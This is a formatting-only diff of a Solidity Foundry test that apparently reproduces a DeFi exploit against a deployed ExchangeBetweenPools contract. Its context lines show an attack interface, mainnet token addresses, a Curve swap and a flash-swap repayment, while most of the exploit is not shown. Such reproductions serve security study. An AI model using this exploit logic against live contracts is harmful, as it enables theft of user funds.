@@ -19,10 +19,13 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface IExchangeBetweenPools {
+
     function doExchange(uint256 amounts) external returns (bool);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IExchangeBetweenPools ExchangeBetweenPools = IExchangeBetweenPools(0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D);
@@ -56,4 +59,5 @@ contract ContractTest is Test {
         curveYSwap.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
         USDC.transfer(address(Pair), 120_000 * 1e6 + uint256(amount1));
     }
+
 }
